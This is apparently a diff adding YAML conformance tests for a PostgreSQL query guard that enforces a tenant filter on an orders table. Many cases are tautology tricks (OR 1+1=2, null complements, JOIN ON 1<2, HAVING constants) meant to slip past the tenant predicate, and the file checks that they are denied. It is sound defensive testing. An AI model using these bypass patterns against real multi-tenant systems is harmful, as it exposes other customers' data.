+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_constant_leaf_rejected[1 + 1 = 2]", "differs"]
+  - name: "sqlg-adapted tautology on tenant table: 1 + 1 = 2"
+    sql: "SELECT id, total FROM orders WHERE account_id = 42 OR (1 + 1 = 2) LIMIT 10"
+    expect: deny
+    codes: [E_TENANT_MISSING]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_constant_leaf_rejected[1 + 1 = 2]", "sqlg-adapted"]
+  - name: "tautology on global table allowed: abs(-5) = 5"
+    sql: "SELECT id, name FROM users WHERE id = 1 OR (abs(-5) = 5) LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_constant_leaf_rejected[abs(-5) = 5]", "differs"]
+  - name: "sqlg-adapted tautology on tenant table: abs(-5) = 5"
+    sql: "SELECT id, total FROM orders WHERE account_id = 42 OR (abs(-5) = 5) LIMIT 10"
+    expect: deny
+    codes: [E_TENANT_MISSING]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_constant_leaf_rejected[abs(-5) = 5]", "sqlg-adapted"]
+  - name: "tautology on global table allowed: round(1.5) = 2"
+    sql: "SELECT id, name FROM users WHERE id = 1 OR (round(1.5) = 2) LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_constant_leaf_rejected[round(1.5) = 2]", "differs"]
+  - name: "sqlg-adapted tautology on tenant table: round(1.5) = 2"
+    sql: "SELECT id, total FROM orders WHERE account_id = 42 OR (round(1.5) = 2) LIMIT 10"
+    expect: deny
+    codes: [E_TENANT_MISSING]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_constant_leaf_rejected[round(1.5) = 2]", "sqlg-adapted"]
+  - name: "tautology on global table allowed: power(2, 3) = 8"
+    sql: "SELECT id, name FROM users WHERE id = 1 OR (power(2, 3) = 8) LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_constant_leaf_rejected[power(2, 3) = 8]", "differs"]
+  - name: "sqlg-adapted tautology on tenant table: power(2, 3) = 8"
+    sql: "SELECT id, total FROM orders WHERE account_id = 42 OR (power(2, 3) = 8) LIMIT 10"
+    expect: deny
+    codes: [E_TENANT_MISSING]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_constant_leaf_rejected[power(2, 3) = 8]", "sqlg-adapted"]
+  - name: "tautology on global table allowed: lower('AB') = 'ab'"
+    sql: "SELECT id, name FROM users WHERE id = 1 OR (lower('AB') = 'ab') LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_constant_leaf_rejected[lower('AB') = 'ab']", "differs"]
+  - name: "sqlg-adapted tautology on tenant table: lower('AB') = 'ab'"
+    sql: "SELECT id, total FROM orders WHERE account_id = 42 OR (lower('AB') = 'ab') LIMIT 10"
+    expect: deny
+    codes: [E_TENANT_MISSING]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_constant_leaf_rejected[lower('AB') = 'ab']", "sqlg-adapted"]
+  - name: "tautology on global table allowed: concat('a','b') = 'ab'"
+    sql: "SELECT id, name FROM users WHERE id = 1 OR (concat('a','b') = 'ab') LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_constant_leaf_rejected[concat('a','b') = 'ab']", "differs"]
+  - name: "sqlg-adapted tautology on tenant table: concat('a','b') = 'ab'"
+    sql: "SELECT id, total FROM orders WHERE account_id = 42 OR (concat('a','b') = 'ab') LIMIT 10"
+    expect: deny
+    codes: [E_TENANT_MISSING]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_constant_leaf_rejected[concat('a','b') = 'ab']", "sqlg-adapted"]
+  - name: "tautology on global table allowed: 1 BETWEEN 0 AND 10"
+    sql: "SELECT id, name FROM users WHERE id = 1 OR (1 BETWEEN 0 AND 10) LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_constant_leaf_rejected[1 BETWEEN 0 AND 10]", "differs"]
+  - name: "sqlg-adapted tautology on tenant table: 1 BETWEEN 0 AND 10"
+    sql: "SELECT id, total FROM orders WHERE account_id = 42 OR (1 BETWEEN 0 AND 10) LIMIT 10"
+    expect: deny
+    codes: [E_TENANT_MISSING]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_constant_leaf_rejected[1 BETWEEN 0 AND 10]", "sqlg-adapted"]
+  - name: "tautology on global table allowed: 1 IN (1, 2, 3)"
+    sql: "SELECT id, name FROM users WHERE id = 1 OR (1 IN (1, 2, 3)) LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_constant_leaf_rejected[1 IN (1, 2, 3)]", "differs"]
+  - name: "sqlg-adapted tautology on tenant table: 1 IN (1, 2, 3)"
+    sql: "SELECT id, total FROM orders WHERE account_id = 42 OR (1 IN (1, 2, 3)) LIMIT 10"
+    expect: deny
+    codes: [E_TENANT_MISSING]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_constant_leaf_rejected[1 IN (1, 2, 3)]", "sqlg-adapted"]
+  - name: "tautology on global table allowed: 1 = ANY(ARRAY[1, 2, 3])"
+    sql: "SELECT id, name FROM users WHERE id = 1 OR (1 = ANY(ARRAY[1, 2, 3])) LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_constant_leaf_rejected[1 = ANY(ARRAY[1, 2, 3])]", "differs"]
+  - name: "sqlg-adapted tautology on tenant table: 1 = ANY(ARRAY[1, 2, 3])"
+    sql: "SELECT id, total FROM orders WHERE account_id = 42 OR (1 = ANY(ARRAY[1, 2, 3])) LIMIT 10"
+    expect: deny
+    codes: [E_TENANT_MISSING]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_constant_leaf_rejected[1 = ANY(ARRAY[1, 2, 3])]", "sqlg-adapted"]
+  - name: "tautology on global table allowed: EXISTS (SELECT 1)"
+    sql: "SELECT id, name FROM users WHERE id = 1 OR (EXISTS (SELECT 1)) LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_constant_leaf_rejected[EXISTS (SELECT 1)]", "differs"]
+  - name: "sqlg-adapted tautology on tenant table: EXISTS (SELECT 1)"
+    sql: "SELECT id, total FROM orders WHERE account_id = 42 OR (EXISTS (SELECT 1)) LIMIT 10"
+    expect: deny
+    codes: [E_TENANT_MISSING]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_constant_leaf_rejected[EXISTS (SELECT 1)]", "sqlg-adapted"]
+  - name: "tautology on global table allowed: (SELECT 1) = 1"
+    sql: "SELECT id, name FROM users WHERE id = 1 OR ((SELECT 1) = 1) LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_constant_leaf_rejected[(SELECT 1) = 1]", "differs"]
+  - name: "sqlg-adapted tautology on tenant table: (SELECT 1) = 1"
+    sql: "SELECT id, total FROM orders WHERE account_id = 42 OR ((SELECT 1) = 1) LIMIT 10"
+    expect: deny
+    codes: [E_TENANT_MISSING]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_constant_leaf_rejected[(SELECT 1) = 1]", "sqlg-adapted"]
+  - name: "tautology on global table allowed: NULLIF(NULL, 1) IS NULL"
+    sql: "SELECT id, name FROM users WHERE id = 1 OR (NULLIF(NULL, 1) IS NULL) LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_constant_leaf_rejected[NULLIF(NULL, 1) IS NULL]", "differs"]
+  - name: "sqlg-adapted tautology on tenant table: NULLIF(NULL, 1) IS NULL"
+    sql: "SELECT id, total FROM orders WHERE account_id = 42 OR (NULLIF(NULL, 1) IS NULL) LIMIT 10"
+    expect: deny
+    codes: [E_TENANT_MISSING]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_constant_leaf_rejected[NULLIF(NULL, 1) IS NULL]", "sqlg-adapted"]
+  - name: "tautology on global table allowed: CASE WHEN 1 = 1 THEN true END"
+    sql: "SELECT id, name FROM users WHERE id = 1 OR (CASE WHEN 1 = 1 THEN true END) LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_constant_leaf_rejected[CASE WHEN 1 = 1 THEN true END]", "differs"]
+  - name: "sqlg-adapted tautology on tenant table: CASE WHEN 1 = 1 THEN true END"
+    sql: "SELECT id, total FROM orders WHERE account_id = 42 OR (CASE WHEN 1 = 1 THEN true END) LIMIT 10"
+    expect: deny
+    codes: [E_TENANT_MISSING]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_constant_leaf_rejected[CASE WHEN 1 = 1 THEN true END]", "sqlg-adapted"]
+  - name: "tautology on global table allowed: 1 IS NOT DISTINCT FROM 1"
+    sql: "SELECT id, name FROM users WHERE id = 1 OR (1 IS NOT DISTINCT FROM 1) LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_constant_leaf_rejected[1 IS NOT DISTINCT FROM 1]", "differs"]
+  - name: "sqlg-adapted tautology on tenant table: 1 IS NOT DISTINCT FROM 1"
+    sql: "SELECT id, total FROM orders WHERE account_id = 42 OR (1 IS NOT DISTINCT FROM 1) LIMIT 10"
+    expect: deny
+    codes: [E_TENANT_MISSING]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_constant_leaf_rejected[1 IS NOT DISTINCT FROM 1]", "sqlg-adapted"]
+  - name: "tautology on global table allowed: 1 IS TRUE"
+    sql: "SELECT id, name FROM users WHERE id = 1 OR (1 IS TRUE) LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_constant_leaf_rejected[1 IS TRUE]", "differs"]
+  - name: "sqlg-adapted tautology on tenant table: 1 IS TRUE"
+    sql: "SELECT id, total FROM orders WHERE account_id = 42 OR (1 IS TRUE) LIMIT 10"
+    expect: deny
+    codes: [E_TENANT_MISSING]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_constant_leaf_rejected[1 IS TRUE]", "sqlg-adapted"]
+  - name: "tautology on global table allowed: ARRAY[1] IS NOT NULL"
+    sql: "SELECT id, name FROM users WHERE id = 1 OR (ARRAY[1] IS NOT NULL) LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_constant_leaf_rejected[ARRAY[1] IS NOT NULL]", "differs"]
+  - name: "sqlg-adapted tautology on tenant table: ARRAY[1] IS NOT NULL"
+    sql: "SELECT id, total FROM orders WHERE account_id = 42 OR (ARRAY[1] IS NOT NULL) LIMIT 10"
+    expect: deny
+    codes: [E_TENANT_MISSING]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_constant_leaf_rejected[ARRAY[1] IS NOT NULL]", "sqlg-adapted"]
+  - name: "tautology on global table allowed: coalesce(false, true)"
+    sql: "SELECT id, name FROM users WHERE id = 1 OR (coalesce(false, true)) LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_constant_leaf_rejected[coalesce(false, true)]", "differs"]
+  - name: "sqlg-adapted tautology on tenant table: coalesce(false, true)"
+    sql: "SELECT id, total FROM orders WHERE account_id = 42 OR (coalesce(false, true)) LIMIT 10"
+    expect: deny
+    codes: [E_TENANT_MISSING]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_constant_leaf_rejected[coalesce(false, true)]", "sqlg-adapted"]
+  - name: "tautology on global table allowed: 'a' LIKE 'a'"
+    sql: "SELECT id, name FROM users WHERE id = 1 OR ('a' LIKE 'a') LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_constant_leaf_rejected['a' LIKE 'a']", "differs"]
+  - name: "sqlg-adapted tautology on tenant table: 'a' LIKE 'a'"
+    sql: "SELECT id, total FROM orders WHERE account_id = 42 OR ('a' LIKE 'a') LIMIT 10"
+    expect: deny
+    codes: [E_TENANT_MISSING]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_constant_leaf_rejected['a' LIKE 'a']", "sqlg-adapted"]
+  - name: "column self equality on global table"
+    sql: "SELECT id FROM users WHERE id = 1 OR id = id LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_column_self_equality_rejected", "differs"]
+  - name: "self equality wrapper on global table: id = (id)"
+    sql: "SELECT id FROM users WHERE id = 1 OR (id = (id)) LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_self_equality_paren_cast_wrappers_caught", "differs"]
+  - name: "self equality wrapper on global table: (id) = id"
+    sql: "SELECT id FROM users WHERE id = 1 OR ((id) = id) LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_self_equality_paren_cast_wrappers_caught", "differs"]
+  - name: "self equality wrapper on global table: (id) = (id)"
+    sql: "SELECT id FROM users WHERE id = 1 OR ((id) = (id)) LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_self_equality_paren_cast_wrappers_caught", "differs"]
+  - name: "self equality wrapper on global table: id::int = id"
+    sql: "SELECT id FROM users WHERE id = 1 OR (id::int = id) LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_self_equality_paren_cast_wrappers_caught", "differs"]
+  - name: "self equality wrapper on global table: id = id::int"
+    sql: "SELECT id FROM users WHERE id = 1 OR (id = id::int) LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_self_equality_paren_cast_wrappers_caught", "differs"]
+  - name: "self equality wrapper on global table: id::text = id::text"
+    sql: "SELECT id FROM users WHERE id = 1 OR (id::text = id::text) LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_self_equality_paren_cast_wrappers_caught", "differs"]
+  - name: "sqlg-adapted self equality on tenant table: account_id = (account_id)"
+    sql: "SELECT id FROM orders WHERE account_id = 42 OR (account_id = (account_id)) LIMIT 10"
+    expect: deny
+    codes: [E_TENANT_MISSING]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_self_equality_paren_cast_wrappers_caught", "sqlg-adapted"]
+  - name: "sqlg-adapted self equality on tenant table: account_id::int = account_id"
+    sql: "SELECT id FROM orders WHERE account_id = 42 OR (account_id::int = account_id) LIMIT 10"
+    expect: deny
+    codes: [E_TENANT_MISSING]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_self_equality_paren_cast_wrappers_caught", "sqlg-adapted"]
+  - name: "null complement on global table: id IS NULL OR id IS NOT NULL"
+    sql: "SELECT id FROM users WHERE id = 1 OR (id IS NULL OR id IS NOT NULL) LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_null_complement_or_rejected", "differs"]
+  - name: "null complement on global table: id IS NOT NULL OR id IS NULL"
+    sql: "SELECT id FROM users WHERE id = 1 OR (id IS NOT NULL OR id IS NULL) LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_null_complement_or_rejected", "differs"]
+  - name: "null complement on global table: users.id IS NULL OR users.id IS NOT NULL"
+    sql: "SELECT id FROM users WHERE id = 1 OR (users.id IS NULL OR users.id IS NOT NULL) LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_null_complement_or_rejected", "differs"]
+  - name: "null complement on global table: (id) IS NULL OR id IS NOT NULL"
+    sql: "SELECT id FROM users WHERE id = 1 OR ((id) IS NULL OR id IS NOT NULL) LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_null_complement_or_rejected", "differs"]
+  - name: "sqlg-adapted null complement on tenant table"
+    sql: "SELECT id FROM orders WHERE account_id = 42 OR (account_id IS NULL OR account_id IS NOT NULL) LIMIT 10"
+    expect: deny
+    codes: [E_TENANT_MISSING]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_null_complement_or_rejected", "sqlg-adapted"]
+  - name: "legit null check: id IS NULL"
+    sql: "SELECT id FROM users WHERE id IS NULL LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_legit_null_check_not_flagged"]
+  - name: "legit null check: id IS NOT NULL"
+    sql: "SELECT id FROM users WHERE id IS NOT NULL LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_legit_null_check_not_flagged"]
+  - name: "legit null check: name IS NULL AND id = 1"
+    sql: "SELECT id FROM users WHERE name IS NULL AND id = 1 LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_legit_null_check_not_flagged"]
+  - name: "self IN on global table: id IN (id)"
+    sql: "SELECT id FROM users WHERE id = 1 OR (id IN (id)) LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_self_in_membership_rejected", "differs"]
+  - name: "self IN on global table: id IN (id, 1, 2)"
+    sql: "SELECT id FROM users WHERE id = 1 OR (id IN (id, 1, 2)) LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_self_in_membership_rejected", "differs"]
+  - name: "self IN on global table: id IN (1, id)"
+    sql: "SELECT id FROM users WHERE id = 1 OR (id IN (1, id)) LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_self_in_membership_rejected", "differs"]
+  - name: "self IN on global table: id IN (id, id)"
+    sql: "SELECT id FROM users WHERE id = 1 OR (id IN (id, id)) LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_self_in_membership_rejected", "differs"]
+  - name: "legit IN membership"
+    sql: "SELECT id FROM users WHERE id IN (1, 2, 3) LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_legit_in_membership_not_flagged"]
+  - name: "join ON 1 < 2 on global table"
+    sql: "SELECT u1.id FROM users u1 JOIN users u2 ON 1 < 2 WHERE u1.id = 1 LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_join_on_tautology_caught", "ambiguous"]
+  - name: "sqlg-adapted join ON 1 < 2 on tenant table"
+    sql: "SELECT o2.id FROM orders o1 JOIN orders o2 ON 1 < 2 WHERE o1.account_id = 42 LIMIT 10"
+    expect: deny
+    codes: [E_TENANT_MISSING]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_join_on_tautology_caught", "sqlg-adapted"]
+  - name: "real data predicate: id = 1"
+    sql: "SELECT id, name FROM users WHERE id = 1 LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_real_data_predicate_not_flagged"]
+  - name: "real data predicate: name LIKE 'A%'"
+    sql: "SELECT id, name FROM users WHERE name LIKE 'A%' LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_real_data_predicate_not_flagged"]
+  - name: "real data predicate: substring(name, 1, 3) = 'Bob'"
+    sql: "SELECT id, name FROM users WHERE substring(name, 1, 3) = 'Bob' LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_real_data_predicate_not_flagged"]
+  - name: "real data predicate: lower(name) = 'alice'"
+    sql: "SELECT id, name FROM users WHERE lower(name) = 'alice' LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_real_data_predicate_not_flagged"]
+  - name: "real data predicate: concat(name, '!') = 'Bob!'"
+    sql: "SELECT id, name FROM users WHERE concat(name, '!') = 'Bob!' LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_real_data_predicate_not_flagged"]
+  - name: "real data predicate: id BETWEEN 1 AND 100"
+    sql: "SELECT id, name FROM users WHERE id BETWEEN 1 AND 100 LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_real_data_predicate_not_flagged"]
+  - name: "real data predicate: id IN (SELECT id FROM users WHERE name = 'Alice')"
+    sql: "SELECT id, name FROM users WHERE id IN (SELECT id FROM users WHERE name = 'Alice') LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_real_data_predicate_not_flagged"]
+  - name: "real data predicate: (id)::text = '1'"
+    sql: "SELECT id, name FROM users WHERE (id)::text = '1' LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_real_data_predicate_not_flagged"]
+  - name: "real data predicate: EXISTS (SELECT 1 FROM users u2 WHERE u2.id = users.id)"
+    sql: "SELECT id, name FROM users WHERE EXISTS (SELECT 1 FROM users u2 WHERE u2.id = users.id) LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_real_data_predicate_not_flagged"]
+  - name: "real data predicate: name = ANY(ARRAY['Alice', 'Bob'])"
+    sql: "SELECT id, name FROM users WHERE name = ANY(ARRAY['Alice', 'Bob']) LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_real_data_predicate_not_flagged"]
+  - name: "real data predicate: id + 1 = 2"
+    sql: "SELECT id, name FROM users WHERE id + 1 = 2 LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_real_data_predicate_not_flagged"]
+  - name: "real data predicate: abs(id) > 0"
+    sql: "SELECT id, name FROM users WHERE abs(id) > 0 LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_real_data_predicate_not_flagged"]
+  - name: "real data predicate: NOT (id = 99)"
+    sql: "SELECT id, name FROM users WHERE NOT (id = 99) LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_real_data_predicate_not_flagged"]
+  - name: "paren-wrapped tautology on global table"
+    sql: "SELECT id, name FROM users WHERE id = 1 OR (1 = 1) LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_no_double_flag_on_paren_wrapped_leaf", "differs"]
+  - name: "HAVING constant on global table: 1=1"
+    sql: "SELECT id FROM users GROUP BY id HAVING 1=1 LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_having_constant_caught", "differs"]
+  - name: "HAVING constant on global table: true"
+    sql: "SELECT id FROM users GROUP BY id HAVING true LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_having_constant_caught", "differs"]
+  - name: "HAVING constant on global table: 'true'::boolean"
+    sql: "SELECT id FROM users GROUP BY id HAVING 'true'::boolean LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_having_constant_caught", "differs"]
+  - name: "HAVING constant on global table: 1+1=2"
+    sql: "SELECT id FROM users GROUP BY id HAVING 1+1=2 LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_having_constant_caught", "differs"]
+  - name: "HAVING null complement on global table"
+    sql: "SELECT id FROM users GROUP BY id HAVING id IS NULL OR id IS NOT NULL LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_having_null_complement_caught", "differs"]
+  - name: "sqlg-adapted HAVING tenant filter does not count"
+    sql: "SELECT account_id, count(*) FROM orders GROUP BY account_id HAVING account_id = 42 LIMIT 10"
+    expect: deny
+    codes: [E_TENANT_MISSING]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_having_constant_caught", "sqlg-adapted"]
+  - name: "legit HAVING aggregate"
+    sql: "SELECT id, count(*) AS c FROM users GROUP BY id HAVING count(*) > 1 LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_legit_having_aggregate_not_flagged"]
+  - name: "QUALIFY is not PostgreSQL"
+    sql: "SELECT id FROM users QUALIFY 1=1 LIMIT 10"
+    expect: deny
+    codes: [E_PARSE]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_qualify_constant_caught", "differs-code"]
+  - name: "QUALIFY window is not PostgreSQL"
+    sql: "SELECT id FROM users QUALIFY row_number() OVER () = 1 LIMIT 10"
+    expect: deny
+    codes: [E_PARSE]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_legit_qualify_window_not_flagged", "differs"]
+  - name: "CONNECT BY is not PostgreSQL: START WITH 1=1 CONNECT BY id = id"
+    sql: "SELECT id FROM users START WITH 1=1 CONNECT BY id = id LIMIT 10"
+    expect: deny
+    codes: [E_PARSE]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_connect_by_tautology_caught", "differs-code"]
+  - name: "CONNECT BY is not PostgreSQL: START WITH true CONNECT BY 2=2"
+    sql: "SELECT id FROM users START WITH true CONNECT BY 2=2 LIMIT 10"
+    expect: deny
+    codes: [E_PARSE]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTautologies::test_connect_by_tautology_caught", "differs-code"]
+  - name: "missing predicate"
+    sql: "SELECT id FROM orders LIMIT 10"
+    expect: deny
+    codes: [E_TENANT_MISSING]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTenantIsolation::test_missing_predicate_rejected"]
+  - name: "wrong tenant value"
+    sql: "SELECT id FROM orders WHERE account_id = 99 LIMIT 10"
+    expect: deny
+    codes: [E_TENANT_MISMATCH]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTenantIsolation::test_wrong_tenant_value_rejected", "differs-code"]
+  - name: "OR-wrapped predicate"
+    sql: "SELECT id FROM orders WHERE account_id = 42 OR id = 5 LIMIT 10"
+    expect: deny
+    codes: [E_TENANT_MISSING]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTenantIsolation::test_or_wrapped_predicate_does_not_satisfy"]
+  - name: "IN single literal is an equality conjunct"
+    sql: "SELECT id FROM orders WHERE account_id IN (42) LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTenantIsolation::test_in_single_literal_satisfies_equality", "ambiguous"]
+  - name: "flipped equality 42 = account_id"
+    sql: "SELECT id, total FROM orders WHERE 42 = account_id LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTenantIsolation::test_flipped_equality_satisfies_predicate", "ambiguous"]
+  - name: "IN multiple literals"
+    sql: "SELECT id FROM orders WHERE account_id IN (42, 99) LIMIT 10"
+    expect: deny
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTenantIsolation::test_in_multiple_literals_does_not_satisfy_equality"]
+  - name: "cast around column does not prove"
+    sql: "SELECT id FROM orders WHERE account_id::text = '42' LIMIT 10"
+    expect: deny
+    codes: [E_TENANT_MISSING]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTenantIsolation::test_cast_around_column_accepted", "differs"]
+  - name: "self join filters only one alias"
+    sql: "SELECT o2.id FROM orders o1 JOIN orders o2 ON o1.id = o2.id WHERE o1.account_id = 42"
+    expect: deny
+    codes: [E_TENANT_MISSING]
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTenantIsolation::test_self_join_requires_every_alias_filtered"]
+  - name: "self join both aliases filtered"
+    sql: "SELECT o2.id FROM orders o1 JOIN orders o2 ON o1.id = o2.id WHERE o1.account_id = 42 AND o2.account_id = 42 LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTenantIsolation::test_self_join_both_aliases_filtered_passes"]
+  - name: "inner join ON predicate proves"
+    sql: "SELECT u.id FROM users u JOIN orders o ON u.id = o.id AND o.account_id = 42 LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTenantIsolation::test_inner_join_on_predicate_satisfies"]
+  - name: "LEFT JOIN ON predicate proves the nullable side"
+    sql: "SELECT u.id FROM users u LEFT JOIN orders o ON u.id = o.id AND o.account_id = 42 LIMIT 10"
+    expect: allow
+    bind: []
+    tags: ["conformance", "sqlg:tests/test_security.py::TestTenantIsolation::test_left_join_on_predicate_does_not_satisfy", "differs"]
+  - name: "sqlg-adapted LEFT JOIN ON does not prove the preserved side"
+    sql: "SELECT o.id FROM orders o LEFT JOIN users u ON u.id = o.id AND o.account_id = 42 LIMIT 10"
+    expect: deny
